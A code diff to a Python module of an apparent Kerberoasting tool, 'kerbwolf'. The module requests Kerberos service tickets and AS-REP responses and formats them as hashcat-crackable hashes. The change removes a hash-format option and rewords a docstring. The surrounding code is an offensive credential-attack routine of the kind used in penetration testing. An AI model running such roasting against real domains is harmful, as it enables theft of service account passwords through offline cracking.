@@ -1,7 +1,7 @@
 # SPDX-License-Identifier: Apache-2.0
 """TGS-REP Roast (Kerberoast) - request service tickets and extract hashes.
 
-Supports all 5 Windows encryption types uniformly.  Targets can be
+Works the same way for every encryption type.  Targets can be
 SPNs (``service/host``), sAMAccountNames (``svc_sql``), or UPNs
 (``user@domain``).
 
@@ -24,7 +24,7 @@ from kerbwolf.core.asreq import probe_account_salt, request_asrep_no_preauth, re
 from kerbwolf.core.crypto import ENCTYPE_TABLE
 from kerbwolf.core.tgsreq import request_tgs_raw
 from kerbwolf.hashcat import format_tgs_hash, tgs_hashcat_mode
-from kerbwolf.models import EncryptionType, HashFormat, KDCError, KerberosCredential, RoastResult, TransportProtocol
+from kerbwolf.models import EncryptionType, KDCError, KerberosCredential, RoastResult, TransportProtocol
 
 _log = logging.getLogger(__name__)
 
@@ -41,7 +41,6 @@ def kerberoast(
     domain: str = "",
     etypes: tuple[EncryptionType, ...] = (EncryptionType.RC4_HMAC,),
     target_spns: list[str] | None = None,
-    hash_format: HashFormat = HashFormat.HASHCAT,
     transport: TransportProtocol = TransportProtocol.TCP,
     timeout: float = 10.0,
     tgt: bytes | None = None,
@@ -111,7 +110,7 @@ def kerberoast(
             if ticket_etype != EncryptionType.RC4_HMAC:
                 _log.warning("%s: salt not verified via ETYPE-INFO2 — AES hash may not crack if username casing is wrong", target)
 
-        hash_string = format_tgs_hash(raw_tgs, username, hash_realm, target, fmt=hash_format)
+        hash_string = format_tgs_hash(raw_tgs, username, hash_realm)
 
         results.append(
             RoastResult(
@@ -139,7 +138,6 @@ def kerberoast_no_preauth(
     dc_ip: str,
     etypes: tuple[EncryptionType, ...] = (EncryptionType.RC4_HMAC,),
     target_users: list[str] | None = None,
-    hash_format: HashFormat = HashFormat.HASHCAT,
     transport: TransportProtocol = TransportProtocol.TCP,
     timeout: float = 10.0,
 ) -> list[RoastResult]:
@@ -185,7 +183,7 @@ def kerberoast_no_preauth(
             if ticket_etype != EncryptionType.RC4_HMAC:
                 _log.warning("%s: salt not verified via ETYPE-INFO2 — AES hash may not crack if username casing is wrong", target)
 
-        hash_string = format_tgs_hash(raw_asrep, username, hash_realm, target, fmt=hash_format, is_asreq=True)
+        hash_string = format_tgs_hash(raw_asrep, username, hash_realm, is_asreq=True)
 
         results.append(
             RoastResult(
